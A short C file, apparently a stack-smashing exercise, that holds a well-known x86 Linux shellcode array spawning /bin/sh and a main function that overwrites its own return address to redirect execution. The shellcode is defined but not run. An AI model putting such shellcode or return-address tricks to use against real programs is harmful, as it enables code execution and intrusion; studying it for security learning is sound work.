// shellcode.c
char shellcode[] =    
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
 "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void do_smth()
{
	printf("Got it");
}

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)&do_smth;
}
